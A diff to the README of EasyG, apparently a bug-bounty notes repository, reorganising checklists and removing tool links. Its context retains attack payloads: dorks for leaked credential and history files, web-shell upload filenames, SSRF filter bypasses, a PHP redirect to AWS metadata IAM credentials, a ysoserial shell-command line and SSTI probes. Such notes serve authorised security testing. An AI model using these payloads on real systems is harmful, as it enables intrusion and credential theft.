@@ -169,8 +169,9 @@ EasyG started out as a script that I use to automate some information gathering 
   - [API Security Checklist](https://github.com/shieldfy/API-Security-Checklist)
 - [ ] Errors
   - Change POST to GET
-- [ ] [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
-- [ ] [OWASP Web Application Penetration Checklist](https://wiki.owasp.org/index.php/Testing_Checklist)
+- [ ] [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/index.html), check also
+  - [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
+  - [OWASP Web Application Penetration Checklist](https://wiki.owasp.org/index.php/Testing_Checklist)
 - [ ] [Look at the index of this repo](#index) and see if you missed anything interesting
 
 ## Content Discovery
@@ -224,9 +225,7 @@ EasyG started out as a script that I use to automate some information gathering 
 - `site:` to target a website and its subdomains;
 - `inurl:&` to search for parameters;
 - `intitle:` to search interesting pages like admin, register, login etc.
-- [Dorking on Steroids](https://hazanasec.github.io/2021-03-11-Dorking-on-Steriods/)
 - `"Seeing something unexpected? Take a look at the GitHub profile guide." "COMPANY-TARGET" site:http://github.com` [[Reference](https://twitter.com/c3l3si4n/status/1580564006263173122)]
-- [dorks_hunter](https://github.com/six2dez/dorks_hunter)
 - `intext:"© copyright COMPANY YEAR"` [[Reference](https://twitter.com/intigriti/status/1592497655774871553)]
 - `site:target.com intext:login intext:username intext:password`
 - Exposed .git `intext:"index of /.git" "parent directory"`
@@ -241,7 +240,6 @@ EasyG started out as a script that I use to automate some information gathering 
 - extensions: `extensions: bat, config, ini, env etc.`
 - filename: `netrpc, .git-credentials, .history, .htpasswd, bash_history`
 - [Other dorks](https://github.com/techgaun/github-dorks#list-of-dorks)
-- [GitDorker](https://github.com/obheda12/GitDorker)
 
 
 
@@ -796,7 +794,7 @@ From a user perspective, access controls can be divided into the following categ
   - [s3 perms](#abusing-s3-bucket-permissions)
   - [GCS perms](#google-cloud-storage-bucket)
   
-**Extension Splitting** [[Reference](https://twitter.com/therceman/status/1597858216607481856)]
+**Extension Splitting**
 - shell.php%00.png
 - shell.php%0A.png
 - shell.php\n.png
@@ -835,11 +833,6 @@ $content$
 
 ### <ins>Server-side request forgery (SSRF)</ins>
 
-**Resources**
-- [SSRF Mindmap](https://xmind.app/m/eJm7bd/#)
-- [How I made $31500 by submitting a bug to Facebook](https://medium.com/@win3zz/how-i-made-31500-by-submitting-a-bug-to-facebook-d31bb046e204)
-- [SSRFmap](https://github.com/swisskyrepo/SSRFmap)
-
 **SSRF with blacklist-based input filters bypass**
 Some applications block input containing hostnames like `127.0.0.1` and localhost, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using various techniques:
 - Using an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`;
@@ -854,8 +847,7 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
 - You can use combinations of these techniques together.
 
 **Other tips**
-- By combining it with an open redirect, you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
-- [Open redirection](#open-redirection)
+- By combining it with an [Open redirection](#open-redirection), you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
 - For AWS, bypass some restrictions by hosting this PHP page [[Reference](https://hackerone.com/reports/508459)]
   ```PHP
   <?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
@@ -871,21 +863,15 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
 - Document parsers
   - If it's an XML doc, use the PDF Generator approach
   - In other scenarios, see if there is any way to reference external resources and let server make requests to internal resources
-- Link expansion
-  - Open Graph Protocol is a good case for Blind SSRF / Extract of Meta Data, [[Reference](https://twitter.com/BugBountyHQ/status/868242771617792000)]
+- Link expansion, [[Reference](https://twitter.com/BugBountyHQ/status/868242771617792000)]
 - File uploads
   - Instead of uploading a file, upload a URL. [An example](https://hackerone.com/reports/713)
-
-**Automate with Burp**
-- [Collaborator Everywhere](https://portswigger.net/bappstore/2495f6fb364d48c3b6c984e226c02968)
-- [Taborator](https://portswigger.net/bappstore/c9c37e424a744aa08866652f63ee9e0f) + [AutoRepeater](https://github.com/nccgroup/AutoRepeater) [[Source](https://twitter.com/Bugcrowd/status/1586058991758675969)]
-  ```
-  - Type: Request Param Value
-  - Match: ^(https?|ftp)://[^\s/$.?#].[^\s]*$
-  - Replace: http://$collabplz/
-  - Comment: Burp Collab
-  - Regex Match: [x]
-  ```
+  - Use an SVG file
+    ```svg
+	<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    	<image xlink:href="https://example.com/test.png"/>
+	</svg>
+    ```
 
 
 
@@ -1346,9 +1332,6 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . ec
   #{7*7}
   #{ 7 * 7 }
   ```
-
-**Resource**
-- [Tplmap](https://github.com/epinna/tplmap) for SSTI exploitation
 
 
 
